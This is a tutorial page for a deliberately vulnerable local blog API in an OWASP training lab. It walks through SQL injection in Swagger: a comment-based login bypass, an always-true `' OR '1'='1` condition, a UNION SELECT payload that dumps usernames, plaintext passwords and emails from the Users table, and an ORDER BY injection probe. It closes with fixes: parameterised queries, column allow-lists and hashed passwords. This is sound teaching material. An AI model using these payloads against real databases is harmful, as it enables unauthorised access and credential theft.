---
title: A05 Injection
sidebar_position: 5
---

## Overview

Injection happens when input from the caller is pasted straight into a command the server runs, so the caller can change what that command does. The classic example is SQL injection: text that was meant to be a search term becomes part of the query. It is number five in the OWASP Top 10 (2025).

This lab is a small blog API. Every endpoint builds its SQL by string-concatenating the query parameters, which is exactly the mistake that makes injection possible:

| Flaw                         | What goes wrong                                                                                     | Endpoint                          |
| ---------------------------- | --------------------------------------------------------------------------------------------------- | --------------------------------- |
| **Classic SQL injection**    | The username and password go into a `WHERE` clause, so you can log in as anyone or read every post. | `/lab/vulnerable/getUserBlogs`    |
| **UNION-based SQL injection**| The search term goes into a `LIKE`, so a `UNION SELECT` can return rows from the `Users` table.      | `/lab/vulnerable/searchBlogs`     |
| **ORDER BY injection**       | The sort column goes into `ORDER BY`, where values cannot be parameterised at all.                  | `/lab/vulnerable/getBlogsSorted`  |

:::note

Only the vulnerable side exists for this lab so far. There are no `/lab/secure/...` endpoints yet. The last section explains how each query should be written.

:::

## Access the lab

Start the labs as described in the Installation section of the Introduction page. The Injection service then listens on:

| What             | Address                              |
| ---------------- | ------------------------------------ |
| **Swagger UI**   | `http://localhost:5030/swagger`      |
| API base URL     | `http://localhost:5030`              |
| Second HTTP port | `5031` (same service, also plain HTTP) |
| Database         | `Injection_LAB` on `sqlserver:1433`  |

Open `http://localhost:5030/swagger` in your browser. Swagger is only enabled when `ASPNETCORE_ENVIRONMENT` is `Development`, which the Docker setup already does.

If you run the project from your IDE or with `dotnet run` instead of Docker, use the launch profile: `http` serves `http://localhost:5030`, while `https` serves `https://localhost:5031` and `http://localhost:5030`.

## Seeded data

On first start the service applies its migrations and seeds the database from the JSON files in `src/Context/Data`:

- **100 users** in `dummy.users.json`, each with a username, e-mail, plain-text password, age and a security answer.
- **63 blog posts** in `dummy.blogs.json`, spread over 20 of those users.

The user used below:

| Username | Password     | Has blog posts? |
| -------- | ------------ | --------------- |
| `jena`   | `pass239472` | Yes, 5 of them  |

To find more data, visit the [seed data](https://github.com/yagizerdem/OWASP-lab/tree/main/Lab/Injection/src/Context/Data) in the repository.

## Response format

Every endpoint answers with the same JSON envelope. On success `data` is a list of blog rows:

```json
{
  "message": "Success",
  "data": [
    {
      "id": "...",
      "title": "Quis vel architecto quae numquam sit eum autem",
      "content": "Molestiae dolor ipsa ullam minus et et qui porro...",
      "createdAt": "2026-10-29T21:18:34Z",
      "updatedAt": "2026-10-29T21:18:34Z",
      "authorId": "0be83747-1eba-4aa9-8d58-50d39f303b63",
      "authorUsername": "jena"
    }
  ],
  "status": 200
}
```

Every endpoint returns rows in this shape, with seven fields. That matters for the UNION attack in step 3: the injected query has to produce the same seven columns.

When a query is malformed, SQL Server throws an error. The shared error handler hides the details and answers `500` with `Internal server error`, so you will not see the raw SQL message. You still learn something: a `500` means your input reached the query and broke its syntax.

## Endpoints

All paths start with `http://localhost:5030`. None of them expect any credentials in a header.

| #   | Method | Path                             | Query parameters        | Purpose                                 |
| --- | ------ | -------------------------------- | ----------------------- | --------------------------------------- |
| 1   | `GET`  | `/lab/vulnerable/getUserBlogs`   | `userName`, `password`  | Return a user's posts after a login check |
| 2   | `GET`  | `/lab/vulnerable/searchBlogs`    | `title`                 | Search posts by title                   |
| 3   | `GET`  | `/lab/vulnerable/getBlogsSorted` | `sort` (default `CreatedAt`) | List posts, sorted by a column     |

## Walkthrough in Swagger

In this walkthrough you are a visitor to the blog who only has the search box and the public URLs, and you turn them into a way to read the `Users` table.

### How to send a request in Swagger

Open `http://localhost:5030/swagger`. Every step below follows the same pattern:

1. Find the endpoint in the list and click it to expand it.
2. Click **Try it out**.
3. Type the value from the step into the query field. Type it exactly, including quotes and spaces. Swagger sends the raw text; you do not URL-encode anything yourself.
4. Click **Execute** and read the status code and body under **Server response**.

You never need the **Authorize** button in this lab.

### Step 1: Use the login endpoint normally

Endpoint: **`GET /lab/vulnerable/getUserBlogs`**

Behind this endpoint the query is built like this (simplified):

```sql
... WHERE u.Username = '<userName>' AND u.Password = '<password>'
```

Fill in the two fields with real credentials:

| Field      | Value         |
| ---------- | ------------- |
| `userName` | `jena`        |
| `password` | `pass239472`  |

You get jena's 5 posts. A wrong password returns an empty list, because no row matches. So far it behaves like a login.

### Step 2: Log in as jena without her password

Same endpoint. Now put an injection into `userName` and leave `password` as anything:

| Field      | Value        |
| ---------- | ------------ |
| `userName` | `jena' --`   |
| `password` | `x`          |

The query becomes:

```sql
... WHERE u.Username = 'jena' --' AND u.Password = 'x'
```

Everything after `--` is a SQL comment, so the password check is gone. You get jena's posts with no valid password. The quote you typed closed the string, and `--` deleted the rest of the line.

Now make the condition true for everyone. Put this in `password` and set `userName` back to `jena`:

| Field      | Value          |
| ---------- | -------------- |
| `userName` | `jena`         |
| `password` | `' OR '1'='1`  |

The query becomes:

```sql
... WHERE u.Username = 'jena' AND u.Password = '' OR '1'='1'
```

`'1'='1'` is always true, so the `WHERE` matches every row and you get every post from every author at once.

### Step 3: Read the Users table through the search box (UNION)

Endpoint: **`GET /lab/vulnerable/searchBlogs`**

Used normally, `title` filters posts. Type `quis` into `title` and you get the 3 posts whose title contains that word.

Behind it the query is:

```sql
... WHERE b.Title LIKE '%<title>%' ORDER BY CreatedAt ...
```

A `UNION SELECT` adds a second result set to the first. The trick is that it must have the same number of columns and compatible types, and this endpoint returns seven columns (see Response format). Type this into `title`:

```text
' UNION SELECT Id, Username, Password, CreatedAt, UpdatedAt, Id, Email FROM Users --
```

The query becomes:

```sql
... WHERE b.Title LIKE '%' UNION SELECT Id, Username, Password, CreatedAt, UpdatedAt, Id, Email FROM Users --%' ORDER BY CreatedAt ...
```

The rows that come back are no longer blog posts. Each one carries a user: the `title` field now holds the username and the `content` field holds the password:

```json
{
  "title": "jena",
  "content": "pass239472",
  "authorUsername": "mellie@parisian.name",
  ...
}
```

The columns keep the names from the first `SELECT`, which is why the username shows up under `title` and the password under `content`. You have just read the entire credentials table through a search box. Swap `Password` for `SecurityAnswer` in the payload to pull that column instead.

### Step 4: Confirm the sort parameter is injectable

Endpoint: **`GET /lab/vulnerable/getBlogsSorted`**

Used normally, `sort` names the column to order by. Try these in the `sort` field:

| `sort`      | Result                                          |
| ----------- | ----------------------------------------------- |
| `CreatedAt` | `200`, posts ordered by date (the default).     |
| `Title`     | `200`, posts ordered alphabetically by title.   |

So whatever you type is used as a column name. Now type something that is not a column:

```text
this_is_not_a_column
```

You get `500` with `Internal server error`. The value went straight into `ORDER BY this_is_not_a_column`, SQL Server could not find that column, and the query failed. A column name cannot be sent as a parameter the way a value can, so string concatenation here is especially dangerous; the only safe fix is to accept the sort column from a fixed list. The error details are hidden by the error handler, but the `500` confirms your input reached the SQL.

## How these should be written

There are no secure endpoints in this lab yet. The fix for the first two is the same idea, and the third is different:

- **Steps 1 to 3 (values in the query):** never concatenate input into SQL. Pass it as a parameter, so the database treats it as data, not code. With EF Core that means LINQ (`_context.Blogs.Where(b => b.Title.Contains(title))`) or `FromSqlInterpolated`/`SqlQuery` with `{title}` placeholders. Also, passwords should be verified against a salted hash (see [A04 Cryptographic Failures](./A04%20Cryptographic%20Failures.md)), not read back and compared as plain text.
- **Step 4 (a column name in `ORDER BY`):** a column name cannot be a parameter. Check the value against an allow-list of real column names and reject anything else, then build the `ORDER BY` from the allowed value only.
